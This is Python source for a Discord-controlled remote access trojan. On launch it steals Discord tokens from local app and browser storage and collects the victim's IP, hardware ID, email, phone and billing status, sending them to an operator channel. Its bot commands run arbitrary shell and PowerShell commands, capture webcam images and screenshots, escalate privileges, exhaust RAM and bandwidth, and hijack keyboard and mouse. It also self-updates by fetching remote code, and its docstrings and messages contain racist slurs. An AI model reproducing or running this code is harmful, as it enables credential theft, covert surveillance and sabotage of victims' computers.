import discord
from discord.ext import commands
import requests
import time
import os
import win32con
import subprocess
import webbrowser
import threading
import psutil
from PIL import ImageGrab
import ctypes
import sys
import socket
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from base64 import b64decode
from re import findall
from json import loads
import pygame
import pyautogui
import keyboard
import tempfile
import shutil
import random
import pygetwindow as gw
from browser import Browsers
from _webhook import _WebhookX
from dhooks import Embed
from cryptography.fernet import Fernet
from _random_string import get_random_string

key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
encrypted_token = b"gAAAAABnpwk0AMR2kHz2wQFHUT-eXyqfugs_Zx7mioRteBu8NDlh5NdPmWv8P7BCM_D6wqaWCRqHh9eCdCgx7k80MFoYw5EkM-nVYrpGmy1B0N6VEgApc_K8g_77bHEQnt6koKuwfHCZXsuD-nIy7HmyaKZjk_C4iy6hDy7LR8XVUZj2_p7ty_Q="
cipher_suite = Fernet(key)
DISCORD_BOT_TOKEN = cipher_suite.decrypt(encrypted_token).decode()
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
baseurl = "https://discord.com/api/v9/users/@me"
tokens = []
hostname = socket.gethostname()
changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE

reverse_keys_active = False
mouse_inverted = False
disabledkey = False
pyautogui.FAILSAFE = False
SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/drat.py"
CURRENT_VERSION = "1.0.0"
UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
webhook = "https://discord.com/api/webhooks/1334408432509386822/CyA9d0WeYAqJeaIUuept2SNoN2x0CO7o6gx530fHG0D6XJdLQ9vLsKQBaAeGl3Ap5g8s"
ram_eater_active = False
bandwidth_eater_active = False


def check_for_updates():
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            latest_version = response.text.strip()
            if latest_version > CURRENT_VERSION:
                print(f"[+] Update available: {latest_version}")
                download_latest_script()
                return True
            else:
                print("[+] You are using the latest version.")
                return False
        else:
            print(f"[-] Failed to check for updates. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error checking for updates: {e}")
        return False

def download_latest_script():
    try:
        response = requests.get(SCRIPT_URL)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".py") as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name

            shutil.move(temp_file_path, sys.argv[0])
            print(f"[+] Updated to the latest version. Restarting script...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print(f"[-] Failed to download the latest script. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error updating script: {e}")

def eat_ram():
    global ram_eater_active
    debug("Starting RAM consumption...")
    try:
        x = []
        while ram_eater_active:
            x.append(bytearray(100000000))
            time.sleep(0.5)
    except MemoryError:
        debug("RAM consumption stopped due to memory error.")
    except Exception as e:
        debug(f"Error in eat_ram: {e}")
    finally:
        ram_eater_active = False


# internet eater
def eat_bandwidth():
    global bandwidth_eater_active
    debug("Starting bandwidth consumption...")
    while bandwidth_eater_active:
        try:
            requests.get("http://speedtest.tele2.net/10GB.zip")
        except Exception as e:
            debug(f"Error in eat_bandwidth: {e}")
        time.sleep(1)


def invert_mouse_loop():
    """ Continuously inverts mouse movement in a separate thread """
    global mouse_inverted
    last_x, last_y = pyautogui.position()
    
    while mouse_inverted:
        x, y = pyautogui.position()
        dx, dy = x - last_x, y - last_y
        pyautogui.moveRel(-dx * 2, -dy * 2, duration=0.01)
        last_x, last_y = x, y
        time.sleep(0.01)



def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getUserData(token):
    try:
        response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token)))
        if response.getcode() == 200:
            return loads(response.read().decode())
        else:
            debug(f"Invalid token: {token}")
            return None
    except Exception as e:
        debug(f"Error getting user data: {e}")
        return None

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}") :
                    for token in findall(regex, line):
                        tokens.append(token)
    except Exception as e:
        debug(f"Error getting tokens: {e}")
    return tokens

def whoTheFuckAmI():
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
        debug(f"IP address: {ip}")
        return ip
    except Exception as e:
        debug(f"Error getting IP: {e}")
        return "None"

def hWiD():
    try:
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        debug(f"HWID: {hwid}")
        return hwid
    except Exception as e:
        debug(f"Error getting HWID: {e}")
        return "None"

def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper



async def send_embed(email, phone, nitro, billing, ip, pc_username, pc_name, platform, user_path_name, hwid, token, tokens, username, user_id):
    embed = discord.Embed(
        color=0x7289da,
        title="Republic of Wadiya Intelligence Report",
        description="Details about the moga's account and system."
    )


    embed.add_field(
        name="|Account Info|",
        value=f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
        inline=True
    )
    embed.add_field(
        name="|PC Info|",
        value=f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}\nUser Path: {user_path_name}',
        inline=True
    )
    embed.add_field(
        name="|More Info|",
        value=f"HWID: {hwid}\nToken: {token}",
        inline=False
    )
    embed.add_field(
        name="**Tokens:**",
        value=f"```yaml\n{tokens if tokens else 'No tokens extracted'}\n```",
        inline=False
    )

    embed.set_author(
        name=username,
        icon_url=f"https://cdn.discordapp.com/avatars/{user_id}.png?size=32"
    )
    embed.set_footer(text="Zitemaker")


    channel = bot.get_channel(1335115941444587614)
    await channel.send(embed=embed)


def debug(message):
    print(f"[DEBUG] {message}")

@bot.event
async def on_ready():
    print(f"running")
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI() 
    pc_username = os.getenv("UserName") 
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path): 
            if token in checked:
                continue
            checked.append(token)
            uid = None


            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue


            user_data = getUserData(token)
            if not user_data:
                debug(f"Invalid token or failed to get user data for token: {token}")
                user_data = None 

            working_ids.append(uid)
            working.append(token)


            username = user_data["username"] + "#" + str(user_data["discriminator"]) if user_data else "N/A"
            user_id = user_data["id"] if user_data else "N/A"
            email = user_data.get("email") if user_data else "N/A"
            phone = user_data.get("phone") if user_data else "N/A"
            nitro = bool(user_data.get("premium_type")) if user_data else False
            billing = bool(paymentMethods(token)) if user_data else False
            hwid = hWiD()
            await send_embed(email, phone, nitro, billing, ip, pc_username, pc_name, platform, user_path_name, hwid, token, tokens, username, user_id)


@bot.event
async def on_application_command_error(ctx, error: discord.DiscordException):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.respond("This command is currently on cooldown!")
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.respond("Enter all the arguments nigger")    
    else:
        raise error       
        

bot.on_command_error = on_application_command_error        


@bot.command(name="execute")
async def execute(ctx, name, *, command: str):
    """Execute a command on the victim's PC."""
    if name == os.getenv("UserName"):
        try:
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    response = f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    response = f"Error: {e}"
                await ctx.send(f"Output:\n```{response}```")
                return

            # Process other commands
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate()
            response = stdout + stderr
            response += f"\nCommand exited with code: {process.returncode}"

            await ctx.send(f"Output:\n```{response}```")
        except Exception as e:
            await ctx.send(f"Error executing command: {e}")



@bot.command(name='webcam')
async def webcam(ctx, inputid):
    if inputid == name:
        camlist = pygame.camera.list_cameras()
        fname = str(f'webcampicture_{name}.png')
        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            image = cam.get_image()
            pygame.image.save(image, fname)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Webcam picture `{fname}` from process {name} was sent.')
            os.remove(fname)
        else:
            await ctx.send(f'No camera was found for process {name}.')
    if inputid != name:
        if inputid == 'all':
            camlist = pygame.camera.list_cameras()
            fname = str(f'webcampicture_{name}.png')
            if camlist:
                cam = pygame.camera.Camera(camlist[0], (640, 480))
                cam.start()
                image = cam.get_image()
                pygame.image.save(image, fname)
                await ctx.send(file=discord.File(fname))
                await ctx.send(f'Webcam picture `{fname}` from process {name} was sent.')
                os.remove(fname)
            else:
                await ctx.send(f'No camera was found for process {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')


name = os.getenv("UserName")


@bot.command(name='msgbox')
async def msgbox(ctx, inputid, title, *, msg):
    MB_OK = 0x0 ### BUTTON
    ICON_EXCLAIM = 0x30 ### ICON
    if inputid == name:
                try:
                    ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM)
                    await ctx.send(f'Successfully showed message box for process {name}.')
                except Exception:
                    await ctx.send(f'Couldn\'t show message box for process {name} because of `{Exception}`.')
                return
    if inputid != name:
        if inputid == 'all':
            try:
                        ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM)
                        await ctx.send(f'Successfully showed message box for process {name}.')
            except Exception:
                        await ctx.send(f'Couldn\'t show message box for process {name} because of `{Exception}`.')
                        return
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find the user {inputid}.')
            

@bot.command(name='screenshot')
async def screenshot(ctx, inputid):
    if inputid == name:
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        randomstring = get_random_string(8)
        fname = f'screenshot_{randomstring}.png'
        image.save(fname)
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Screenshot `{fname}` from process {name} was sent.')
        os.remove(fname)
    if inputid != name:
        if inputid == 'all':
            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            fname = f'screenshot_{name}.png'
            image.save(fname)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Screenshot `{fname}` from process {name} was sent.')
            os.remove(fname)
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find the user {inputid}.')


@bot.command(name='wallpaper')
async def wallpaper(ctx, inputid, rawimg):
    if inputid == name:
        r = requests.get(rawimg, allow_redirects=False)
        fname = f'newwallpaper_{name}.jpg' ### ONLY .jpg IMAGES
        open(fname, 'wb').write(r.content)
        path = os.path.abspath(fname)
        ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
        await ctx.send(f'Changed background wallpaper for {name} to `{rawimg}`.')
        os.remove(fname)
    if inputid != name:
        if inputid == 'all':
            r = requests.get(rawimg, allow_redirects=False)
            fname = f'newwallpaper_{name}.jpg'
            open(fname, 'wb').write(r.content)
            path = os.path.abspath(fname)
            ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
            await ctx.send(f'Changed background wallpaper for {name} to `{rawimg}`.')
            os.remove(fname)
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')          

@bot.command(name='tasklist')
async def tasklist(ctx, inputid):
    if inputid == name:
        tasks = str(subprocess.check_output('tasklist', shell=True))
        fname = f'runningtasks_{name}.txt'
        with open(fname, 'w') as f:
            f.write(tasks)
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Wrote all current tasks from process {name} to `{fname}`.')
        os.remove(fname)
    if inputid != name:
        if inputid == 'all':
            tasks = str(subprocess.check_output('tasklist', shell=True))
            fname = f'runningtasks_{name}.txt'
            with open(fname, 'w') as f:
                f.write(tasks)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Wrote all current tasks from process {name} to `{fname}`.')
            os.remove(fname)
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='killprocess')
async def killprocess(ctx, inputid, procname):
    if inputid == name:
        subprocess.run(f'taskkill /f /im {procname}', shell=True)
        await ctx.send(f'Initiated to kill process `{procname}` for client {name}.')
    if inputid != name:
        if inputid == 'all':
            subprocess.run(f'taskkill /f /im {procname}', shell=True)
            await ctx.send(f'Initiated to kill process `{procname}` for client {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')


@bot.command(name='excshell')
async def shell(ctx, inputid, cmd):
    if inputid == name:
        subprocess.run(f'start cmd /f /c {cmd}', shell=True)
        await ctx.send(f'Executed cmd command `{cmd}` for process {name}.')
    if inputid != name:
        if inputid == 'all':
            subprocess.run(f'start cmd /f /c {cmd}', shell=True)
            await ctx.send(f'Executed cmd command `{cmd}` for process {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='excpowershell')
async def powershell(ctx, inputid, shllcmd):
    if inputid == name:
        subprocess.run(f'start powershell /c {shllcmd}', shell=True)
        await ctx.send(f'Executed shell command `{shllcmd}` for process {name}.')
    if inputid != name:
        if inputid == 'all':
            subprocess.run(f'start powershell /c {shllcmd}', shell=True)
            await ctx.send(f'Executed shell command `{shllcmd}` for process {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='isadmin')
async def isadmin(ctx, inputid):
    if inputid == name:
        isadmin = ctypes.windll.shell32.IsUserAnAdmin()
        if isadmin:
            await ctx.send(f'Process {name} **is** admin.')
        if not isadmin:
            await ctx.send(f'Process {name} **is not** admin.')
    if inputid != name:
        if inputid == 'all':
            isadmin = ctypes.windll.shell32.IsUserAnAdmin()
            if isadmin:
                await ctx.send(f'Process {name} **is** admin.')
            if not isadmin:
                await ctx.send(f'Process {name} **is not** admin.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='getadmin')
async def getadmin(ctx, inputid):
    if inputid == name:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        await ctx.send(f'Requested admin access for process {name}.')
        sys.exit(0)
    if inputid != name:
        if inputid == 'all':
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            await ctx.send(f'Requested admin access for process {name}.')
            sys.exit(0)
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')

@bot.command(name='clients')
async def clients(ctx):
    await ctx.send(f'{hostname} - {name}.')
    
@bot.command(name='browser')
async def browser(ctx, inputid, url):
    if inputid == name:
        webbrowser.open(url)
        await ctx.send(f'Opened webbrowser `{url}` for process {name}.')
    if inputid != name:
        if inputid == 'all':
            webbrowser.open(url)
            await ctx.send(f'Opened webbrowser `{url}` for process {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')


@bot.command(name="shutdown")
async def shutdown(ctx, name: str):
    """Shut down the nigger's PC"""     
    if name == os.getenv("UserName"):
        await ctx.send(f"Shutting down {name}'s PC...")
        os.system("shutdown /s /t 1")


@bot.command(name="restart")
async def restart(ctx, name: str):
    """Restart the nigger's PC"""
    if name == os.getenv("UserName"):
        await ctx.send(f"Restarting {name}'s PC...")
        os.system("shutdown /r")


@bot.command(name="lock")
async def lock(ctx, name: str):
    """Lock the nigger's PC"""
    if name == os.getenv("UserName"):
        await ctx.send(f"Locking {name}'s PC...")
        os.system("Rundll32.exe user32.dll,LockWorkStation")                       


@bot.command(name="start_ram")
async def start_ram(ctx, name: str):
    """Start the RAM eater."""
    if name == os.getenv("UserName"):
        global ram_eater_active
        if not ram_eater_active:
            ram_eater_active = True
            threading.Thread(target=eat_ram).start()
            await ctx.send(f"{ctx.author.mention} RAM eater started.")
        else:
            await ctx.send(f"{ctx.author.mention} RAM eater is already running.")

@bot.command(name="stop_ram")
async def stop_ram(ctx, name: str):
    """Stop the RAM eater."""
    if name == os.getenv("UserName"):
        global ram_eater_active
        if ram_eater_active:
            ram_eater_active = False
            await ctx.send(f"{ctx.author.mention} RAM eater stopped.")
        else:
            await ctx.send(f"{ctx.author.mention} RAM eater is not running.")

@bot.command(name="start_bandwidth")
async def start_bandwidth(ctx, name: str):
    """Start the bandwidth eater."""
    if name == os.getenv("UserName"):
        global bandwidth_eater_active
        if not bandwidth_eater_active:
            bandwidth_eater_active = True
            threading.Thread(target=eat_bandwidth).start()
            await ctx.send(f"{ctx.author.mention} Bandwidth eater started.")
        else:
            await ctx.send(f"{ctx.author.mention} Bandwidth eater is already running.")

@bot.command(name="stop_bandwidth")
async def stop_bandwidth(ctx, name: str):
    """Stop the bandwidth eater."""
    if name == os.getenv("UserName"):
        global bandwidth_eater_active
        if bandwidth_eater_active:
            bandwidth_eater_active = False
            await ctx.send(f"{ctx.author.mention} Bandwidth eater stopped.")
        else:
            await ctx.send(f"{ctx.author.mention} Bandwidth eater is not running.")

@bot.command(name="status")
async def status(ctx):
    """Display system status."""
    try:

        username = os.getenv("USERNAME")
        ip = requests.get("https://ifconfig.me").text.strip()
        ram_usage = psutil.virtual_memory().percent
        network_usage = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv


        status_message = (
            f"**System Status**\n"
            f"Username: `{username}`\n"
            f"IP Address: `{ip}`\n"
            f"RAM Usage: `{ram_usage}%`\n"
            f"Network Usage: `{network_usage} bytes`\n"
            f"RAM Eater: `{'Running' if ram_eater_active else 'Stopped'}`\n"
            f"Bandwidth Eater: `{'Running' if bandwidth_eater_active else 'Stopped'}`\n"
        )

        await ctx.send(status_message)
    except Exception as e:
        await ctx.send(f"Error fetching status: {e}")


@bot.command(name="invert_mouse")
async def invert_mouse_cmd(ctx):
    """ Toggles mouse inversion """
    global mouse_inverted
    mouse_inverted = not mouse_inverted

    if mouse_inverted:
        await ctx.send("Mouse movement is now **inverted**! 🎭")
        threading.Thread(target=invert_mouse_loop, daemon=True).start()
    else:
        await ctx.send("Mouse movement **restored**.")

@bot.command(name="reverse_keys")
async def reverse_keys(ctx, user):
    if user == name:
        global reverse_keys_active
        reverse_keys_active = not reverse_keys_active

        if reverse_keys_active:
            await ctx.send("Keyboard input is now **reversed**! 🔄")

            def reverse_typing(event):
                if event.event_type == keyboard.KEY_DOWN and len(event.name) == 1:
                    keyboard.write(event.name[::-1], delay=0)
                    return False

            keyboard.hook(reverse_typing, suppress=True)
        else:
            await ctx.send("Keyboard input **restored**.")
            keyboard.unhook_all()

@bot.command(name="type")
async def type_text(ctx, user, *, text):
    if user == name:
        await ctx.send(f'Typing: `{text}` on victim\'s PC! ⌨️')

        for char in text:
            keyboard.write(char, delay=0.01)
        keyboard.press_and_release("enter")


@bot.command(name="swapmouse")
async def swap_mouse(ctx, user):
    if user == name:
            ctypes.windll.user32.SwapMouseButton(1)
            await ctx.send("🖱 **Mouse buttons swapped!** Left is now right and right is now left!")


@bot.command(name="resetmouse")
async def reset_mouse(ctx, user):
    if user == name:
        ctypes.windll.user32.SwapMouseButton(0)
        await ctx.send("MOUSE reset")



@bot.command(name="disablekeys")
async def disable_keys(ctx, user, *, key):
    global disabledkey
    disabledkey = not disabledkey
    if user == name:
        if not disabledkey:
            keyboard.block_key(key)
            await ctx.send(f"⌨ **Disabled the `{key}` key!** Try typing now nigga 😈")
        else:
            keyboard.restore_state
            await ctx.send("Reset keyboard")


@bot.command(name="cdtray")
async def cd_tray(ctx, user):
    if user == name:
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
        time.sleep(2)
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door closed", None, 0, None)
        await ctx.send("💿 **CD tray is opening and closing!**")


@bot.command(name="volume")
async def random_volume(ctx, user, volume: int):
    if user == name:
        os.system(f"nircmd.exe setsysvolume {volume * 655.35}")
        await ctx.send(f"🔊 **Set volume to {volume}%!**")


@bot.command(name="randomtext")
async def random_typing(ctx):
    random_words = ["i love big black oily muscular men", "hELP me daddy", "im pregnant", "im gay", "Jai Bharat Do Not Redeem It", "I will touch you"]
    text = random.choice(random_words)
    keyboard.write(text)
    keyboard.press_and_release("enter")
    await ctx.send(f"📝 **Typed:** `{text}` on their PC!")


@bot.command(name="fakeerror")
async def fake_error(ctx, user):
    if user == name:
        ctypes.windll.user32.MessageBoxW(0, "A critical error has occurred!", "Windows Error", 0x10 | 0x1)
        await ctx.send("🔥 **Displayed a fake Windows error!**")


@bot.command(name="sys32delpopup")
async def fake_delete_popup(ctx, user):
    if user == name:
        ctypes.windll.user32.MessageBoxW(0, "System32 has been deleted!", "Critical Error", 0x10 | 0x1)
        await ctx.send("🚨 **Displayed a fake System32 deletion popup!**")


@bot.command(name="listtabs")
async def list_browser_tabs(ctx, user):
    if user == name:
        browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]
        open_tabs = []

        for proc in psutil.process_iter(attrs=["pid", "name"]):
            if proc.info["name"].lower() in browsers:
                for window in gw.getWindowsWithTitle(""):
                    if window.title and proc.info["pid"] == window._hWnd:
                        open_tabs.append(window.title)

        if open_tabs:
            await ctx.send("🌐 **Open browser tabs:**\n" + "\n".join(open_tabs))
        else:
         await ctx.send("🚫 **No browser tabs found!**")




def run_rat():
    print(DISCORD_BOT_TOKEN)
    bot.run(DISCORD_BOT_TOKEN)                    
